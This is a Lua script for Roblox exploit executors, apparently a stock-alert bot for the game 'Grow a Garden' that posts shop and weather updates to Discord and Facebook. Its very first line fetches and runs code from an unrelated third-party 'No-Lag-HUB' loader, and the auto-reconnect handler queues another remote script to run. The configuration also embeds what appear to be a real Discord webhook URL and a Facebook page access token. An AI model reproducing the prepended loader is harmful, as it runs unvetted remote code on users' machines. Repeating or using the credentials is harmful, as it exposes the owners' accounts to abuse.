loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()

--[[ 
    @author depso (depthso)
    @description Grow a Garden stock bot script
    Discord + Facebook Posting
]]

type table = {
	[any]: any
}

_G.Configuration = {
	--// Reporting
	["Enabled"] = true,
	["Webhook"] = "https://discord.com/api/webhooks/1389035637566345418/SJ-vZO6SigPj74kpC1l00vhTCBEWO6pNk3g6ap6lMvWoRfHthFsn41ooOSorYiwOdXrt", -- Replace with your Discord webhook
	["Weather Reporting"] = true,

	--// Facebook Integration
	["Facebook Enabled"] = true,
	["Facebook Page ID"] = "112539638184963", -- Your Facebook Page ID
	["Facebook Access Token"] = "EAAJsbRazAzYBOxYGBmliSZCZAC0c62DVwQ0PTG6jdBSZB0aPPCHXJ9FHxaOaYL6lpgHxKZC7zPRnv4Hgli8mQqZAKTWo7tWJZBWj8OtJ2vrPZC3HqIEEkm84v6QuuvCcI3IYLMNsaBVHV3B20nDMcNTLMZBWBcJpR1Wp6b3zcIbq77D00H8omNMkmxuSGL4XxxlXStpiF9iZBaykKRwLMtZBmpCaMZD", -- Long-lived Page Access Token

	--// User
	["Anti-AFK"] = true,
	["Auto-Reconnect"] = true,
	["Rendering Enabled"] = false,

	--// Embeds
	["AlertLayouts"] = {
		["Weather"] = {
			EmbedColor = Color3.fromRGB(42, 109, 255),
		},
		["SeedsAndGears"] = {
			EmbedColor = Color3.fromRGB(56, 238, 23),
			Layout = {
				["ROOT/SeedStock/Stocks"] = "SEEDS STOCK",
				["ROOT/GearStock/Stocks"] = "GEAR STOCK"
			}
		},
		["EventShop"] = {
			EmbedColor = Color3.fromRGB(212, 42, 255),
			Layout = {
				["ROOT/EventShopStock/Stocks"] = "EVENT STOCK"
			}
		},
		["Eggs"] = {
			EmbedColor = Color3.fromRGB(251, 255, 14),
			Layout = {
				["ROOT/PetEggStock/Stocks"] = "EGG STOCK"
			}
		},
		["CosmeticStock"] = {
			EmbedColor = Color3.fromRGB(255, 106, 42),
			Layout = {
				["ROOT/CosmeticStock/ItemStocks"] = "COSMETIC ITEMS STOCK"
			}
		}
	}
}

--// Emoji Maps (move to top so they're available before use)
local EmojiMap = {
	["Carrot"] = "🥕",
	["Strawberry"] = "🍓",
	["Blueberry"] = "🫐",
	["Tomato"] = "🍅",
	["Cauliflower"] = "🥦", -- closest emoji
	["Watermelon"] = "🍉",
	["Rafflesia"] = "🌸",
	["Green"] = "🟢",
	["Apple"] = "🍎",
	["Avocado"] = "🥑",
	["Banana"] = "🍌",
	["Pineapple"] = "🍍",
	["Kiwi"] = "🥝",
	["Bell Pepper"] = "🫑",
	["Prickly Pear"] = "🌵",
	["Loquat"] = "🍑", -- closest emoji
	["Feijoa"] = "🍈",
	["Pitcher"] = "🪣",
	["Plant"] = "🪴",
	["Sugar Apple"] = "🍏",
	-- Gear Shop Items
	["Watering Can"] = "💧",
	["Trowel"] = "🧱",
	["Recall Wrench"] = "🔧",
	["Basic Sprinkler"] = "⚙️",
	["Advanced Sprinkler"] = "🔩",
	["Godly Sprinkler"] = "🌟",
	["Magnifying Glass"] = "🔍",
	["Tanning Mirror"] = "🪞",
	["Master Sprinkler"] = "🏆",
	["Cleaning Spray"] = "🧼",
	["Favorite Tool"] = "❤️",
	["Harvest Tool"] = "🌾",
	["Friendship Pot"] = "🪴",
}

local WeatherEmojiMap = {
	["Wet"] = "💧",
	["Windstruck"] = "🌬️",
	["Moonlit"] = "🌙",
	["Chilled"] = "🧊",
	["Choc"] = "🍫",
	["Bloodlit"] = "🩸",
	["Twisted"] = "🌀",
	["Drenched"] = "🌊",
	["Frozen"] = "❄️",
	["Aurora"] = "🌈",
	["Shocked"] = "⚡",
	["Celestial"] = "✨"
}

--// Compatibility for cloneref and request
local cloneref = cloneref or function(obj) return obj end
local request = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or (krnl and krnl.request)
if not request then
	warn("No supported HTTP request function found. Discord/Facebook posting will not work.")
end

--// Services
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local VirtualUser = cloneref(game:GetService("VirtualUser"))
local RunService = game:GetService("RunService")
local GuiService = game:GetService("GuiService")
local TeleportService = game:GetService("TeleportService")

--// Remotes
local DataStream = ReplicatedStorage.GameEvents.DataStream
local WeatherEventStarted = ReplicatedStorage.GameEvents.WeatherEventStarted

local LocalPlayer = Players.LocalPlayer

--// Facebook Posting
local function FacebookPost(Message: string)
	local FacebookEnabled = _G.Configuration["Facebook Enabled"]
	local PageID = _G.Configuration["Facebook Page ID"]
	local AccessToken = _G.Configuration["Facebook Access Token"]

	if not FacebookEnabled or PageID == "" or AccessToken == "" then return end
	if not request then warn("FacebookPost: No HTTP request function available."); return end

	local FacebookURL = `https://graph.facebook.com/{PageID}/feed`

	local EncodedMessage = HttpService:UrlEncode(Message)
	local EncodedToken = HttpService:UrlEncode(AccessToken)
	local PostBody = `message={EncodedMessage}&access_token={EncodedToken}`

	local RequestData = {
		Url = FacebookURL,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/x-www-form-urlencoded"
		},
		Body = PostBody
	}

	task.spawn(function()
		local success, err = pcall(function()
			local resp = request(RequestData)
			print("[DEBUG] FacebookPost response:", resp and resp.StatusCode, resp and resp.Body)
		end)
		if not success then
			warn("Facebook post failed:", err)
		end
	end)
end

--// Utilities
local function GetConfigValue(Key: string)
	return _G.Configuration[Key]
end

RunService:Set3dRenderingEnabled(GetConfigValue("Rendering Enabled"))
if _G.StockBot then return end
_G.StockBot = true

local function ConvertColor3(Color: Color3): number
	local Hex = Color:ToHex()
	return tonumber(Hex, 16)
end

local function GetDataPacket(Data, Target: string)
	for _, Packet in Data do
		if Packet[1] == Target then
			return Packet[2]
		end
	end
	return
end

local function GetLayout(Type: string)
	return GetConfigValue("AlertLayouts")[Type]
end

local function WebhookSend(Type: string, Fields: table)
	if not GetConfigValue("Enabled") then return end
	if not request then warn("WebhookSend: No HTTP request function available."); return end
	local Layout = GetLayout(Type)
	local Color = ConvertColor3(Layout.EmbedColor)

	local TimeStamp = DateTime.now():ToIsoDate()
	local Body = {
		embeds = { {
			color = Color,
			fields = Fields,
			footer = { text = "Created by Laire Neil Villena" },
			timestamp = TimeStamp
		} }
	}

	local RequestData = {
		Url = GetConfigValue("Webhook"),
		Method = "POST",
		Headers = { ["Content-Type"] = "application/json" },
		Body = HttpService:JSONEncode(Body)
	}

	task.spawn(function()
		local success, err = pcall(function()
			local resp = request(RequestData)
			print("[DEBUG] WebhookSend response:", resp and resp.StatusCode, resp and resp.Body)
		end)
		if not success then
			warn("WebhookSend failed:", err)
		end
	end)
end

local function MakeStockString(Stock: table, opts)
	local String = ""
	opts = opts or {}
	for Name, Data in Stock do 
		local Amount = Data.Stock
		local EggName = Data.EggName 
		Name = EggName or Name
		local Emoji = EmojiMap[Name] or ""
		if opts.noBold then
			String ..= `{Emoji} {Name}: x{Amount}\n`
		else
			String ..= `{Emoji} {Name} **x{Amount}**\n`
		end
	end
	return String
end

--// Rare Items/Weather for Facebook Posting
local RareStockItems = {
	["Feijoa"] = true, --// 1 
	["Pitcher Plant"] = true, --// 2 
	["Sugar Apple"] = true, --// 3 
	["Master Sprinkler"] = true, --// 6 
	["Godly Sprinkler"] = true, --// 7 
}
local RareEggItems = {
	["Paradise Egg"] = true, --// 8 
	["Bug Egg"] = true, --// 9 
	["Mythical Egg"] = true, --// 1 
	["Night Egg"] = true, --// 10 
	["Bee Egg"] = true, --// 11 
	["Oisis Egg"] = true,  --// 12 
}
local RareEventItems = {
	["Traveler's Fruit Seed"] = true, --// 4 
	["Lily of the Valley Seed"] = true, --// 5 
	["Hamster"] = true, --// 1 
}
local RareWeather = {
	["Wet"] = true, --// 1 
	["Windstruck"] = true, --// 1 
	["Moonlit"] = true, --// 1 
	["Chilled"] = true, --// 1 
	["Choc"] = true, --// 1 
	["Bloodlit"] = true, --// 1 
	["Twisted"] = true, --// 1 
	["Drenched"] = true, --// 1 
	["Frozen"] = true, --// 1 
	["Aurora"] = true, --// 1 
	["Shocked"] = true, --// 1 
	["Celestial"] = true, --// 1 
}

--// Image URLs for each rare item/weather (edit these as you design images)
local RareImageMap = {
	-- Stock
	["Feijoa"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/1.jpg",
	["Pitcher Plant"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/2.jpg",
	["Sugar Apple"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/3.jpg",
	["Master Sprinkler"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/6.jpg",
	["Godly Sprinkler"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/7.jpg",
	-- Eggs
	["Paradise Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/8.jpg",
	["Bug Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/10.jpg",
	["Mythical Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/9.jpg",
	["Night Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/11.jpg",
	["Bee Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/12.jpg",
	["Oisis Egg"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/13.jpg",
	-- Event
	["Traveler's Fruit Seed"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/4.jpg",
	["Lily of the Valley Seed"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/5.jpg",
	["Hamster"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/26.jpg",
	-- Weather
	["Wet"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/14.jpg",
	["Windstruck"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/15.jpg",
	["Moonlit"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/16.jpg",
	["Chilled"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/17.jpg",
	["Choc"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/18.jpg",
	["Bloodlit"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/19.jpg",
	["Twisted"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/20.jpg",
	["Drenched"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/21.jpg",
	["Frozen"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/22.jpg",
	["Aurora"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/23.jpg",
	["Shocked"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/24.jpg",
	["Celestial"] = "https://raw.githubusercontent.com/Neil18482/Gag---image-stock/main/image/25.jpg",
}

local function ProcessPacket(Data, Type: string, Layout)
	local Fields = {}
	local FieldsLayout = Layout.Layout
	if not FieldsLayout then return end

	for Packet, Title in FieldsLayout do 
		local Stock = GetDataPacket(Data, Packet)
		if not Stock then return end

		local Field = {
			name = Title,
			value = MakeStockString(Stock),
			inline = true,
			_rawStock = Stock -- Save the raw stock for Facebook
		}
		table.insert(Fields, Field)
	end

	WebhookSend(Type, Fields)

	-- Facebook post for SeedsAndGears, only if rare items present
	if Type == "SeedsAndGears" then
		local hasRare = false
		local rareImageUrl = nil

		for _, field in Fields do
			for itemName, data in field._rawStock do
				local name = data.EggName or itemName
				if RareStockItems[name] or RareEggItems[name] or RareEventItems[name] then
					hasRare = true
					rareImageUrl = RareImageMap[name] or "https://your-image-host.com/placeholder.png"
					break
				end
			end
			if hasRare then break end
		end

		if not hasRare then
			print("[DEBUG] No rare items in stock, skipping Facebook post.")
			return
		end

		local CombinedStock = ""
		for _, field in Fields do
			local fbLabel = field.name
			local unicodeBold = {
				["GEAR STOCK"] = "𝐆𝐄𝐀𝐑 𝐒𝐓𝐎𝐂𝐊",
				["SEEDS STOCK"] = "𝐒𝐄𝐄𝐃𝐒 𝐒𝐓𝐎𝐂𝐊",
				["EVENT STOCK"] = "𝐄𝐕𝐄𝐍𝐓 𝐒𝐓𝐎𝐂𝐊",
				["EGG STOCK"] = "𝐄𝐆𝐆 𝐒𝐓𝐎𝐂𝐊",
				["COSMETIC ITEMS STOCK"] = "𝐂𝐎𝐒𝐌𝐄𝐓𝐈𝐂 𝐈𝐓𝐄𝐌𝐒 𝐒𝐓𝐎𝐂𝐊"
			}
			local header = unicodeBold[fbLabel] or fbLabel
			CombinedStock ..= `📌 {header}\n{MakeStockString(field._rawStock, {noBold=true})}\n`
		end

		local mainTitle = "🌟 𝐆𝐑𝐎𝐖 𝐀 𝐆𝐀𝐑𝐃𝐄𝐍 - 𝐒𝐓𝐎𝐂𝐊 𝐀𝐋𝐄𝐑𝐓 🌟"

		local FacebookMessage = table.concat({
			"==============================",
			mainTitle,
			"==============================",
			"💸",
			"🛒 New Items Just Restocked!",
			"↓",
			CombinedStock,
			"↑",
			"==============================",
			"🌱 Grab them while supplies last!",
			"",
			"#GrowAGarden #StockUpdate #Roblox @followers @topfans"
		}, "\n")

		-- Use the rareImageUrl for the Facebook post
		local imageUrl = rareImageUrl or "https://your-image-host.com/placeholder.png"

		local FacebookURL = `https://graph.facebook.com/{_G.Configuration["Facebook Page ID"]}/feed`
		local EncodedMessage = HttpService:UrlEncode(FacebookMessage)
		local EncodedToken = HttpService:UrlEncode(_G.Configuration["Facebook Access Token"])
		local EncodedImage = HttpService:UrlEncode(imageUrl)
		local PostBody = `message={EncodedMessage}&access_token={EncodedToken}&picture={EncodedImage}`

		local RequestData = {
			Url = FacebookURL,
			Method = "POST",
			Headers = {
				["Content-Type"] = "application/x-www-form-urlencoded"
			},
			Body = PostBody
		}

		print("[DEBUG] FacebookPost called with message:\n" .. FacebookMessage)
		task.spawn(function()
			local success, err = pcall(function()
				local resp = request(RequestData)
				print("[DEBUG] FacebookPost response:", resp and resp.StatusCode, resp and resp.Body)
			end)
			if not success then
				warn("Facebook post failed:", err)
			end
		end)
	end
end

--// Weather Event
WeatherEventStarted.OnClientEvent:Connect(function(Event: string, Length: number)
	if not GetConfigValue("Weather Reporting") then return end

	if not RareWeather[Event] then
		print("[DEBUG] Weather event not rare, skipping Facebook post.")
		return
	end

	local ServerTime = math.round(workspace:GetServerTimeNow())
	local EndUnix = ServerTime + Length

	local WeatherEmoji = WeatherEmojiMap[Event] or "🌤️"

	local FacebookMessage = table.concat({
		`{WeatherEmoji} **Weather Event Detected!**`,
		"",
		`🌪️ Type: {Event}`,
		`⏱️ Duration: {Length} seconds`,
		"",
		"🎮 Game: Grow a Garden",
		"📌 Stock will auto-update here. Stay tuned!"
	}, "\n")

	-- Use the rare image for this weather event
	local imageUrl = RareImageMap[Event] or "https://your-image-host.com/weather_placeholder.png"

	local FacebookURL = `https://graph.facebook.com/{_G.Configuration["Facebook Page ID"]}/feed`
	local EncodedMessage = HttpService:UrlEncode(FacebookMessage)
	local EncodedToken = HttpService:UrlEncode(_G.Configuration["Facebook Access Token"])
	local EncodedImage = HttpService:UrlEncode(imageUrl)
	local PostBody = `message={EncodedMessage}&access_token={EncodedToken}&picture={EncodedImage}`

	local RequestData = {
		Url = FacebookURL,
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/x-www-form-urlencoded"
		},
		Body = PostBody
	}

	task.spawn(function()
		local success, err = pcall(function()
			local resp = request(RequestData)
			print("[DEBUG] FacebookPost response:", resp and resp.StatusCode, resp and resp.Body)
		end)
		if not success then
			warn("Facebook post failed:", err)
		end
	end)

	WebhookSend("Weather", {{
		name = "WEATHER",
		value = `{WeatherEmoji} {Event}\nEnds:<t:{EndUnix}:R>`,
		inline = true
	}})
end)

--// Stock Data Stream
DataStream.OnClientEvent:Connect(function(Type: string, Profile: string, Data: table)
	if Type ~= "UpdateData" then return end
	if not Profile:find(LocalPlayer.Name) then return end

	local Layouts = GetConfigValue("AlertLayouts")
	for Name, Layout in Layouts do
		ProcessPacket(Data, Name, Layout)
	end
end)

--// Anti idle
LocalPlayer.Idled:Connect(function()
	if not GetConfigValue("Anti-AFK") then return end
	VirtualUser:CaptureController()
	VirtualUser:ClickButton2(Vector2.new())
end)

--// Auto reconnect
GuiService.ErrorMessageChanged:Connect(function()
	if not GetConfigValue("Auto-Reconnect") then return end

	local IsSingle = #Players:GetPlayers() <= 1
	local PlaceId = game.PlaceId
	local JobId = game.JobId

	queue_on_teleport("https://rawscripts.net/raw/Grow-a-Garden-Grow-a-Garden-Stock-bot-41500")

	if IsSingle then
		TeleportService:Teleport(PlaceId, LocalPlayer)
	else
		TeleportService:TeleportToPlaceInstance(PlaceId, JobId, LocalPlayer)
	end
end)
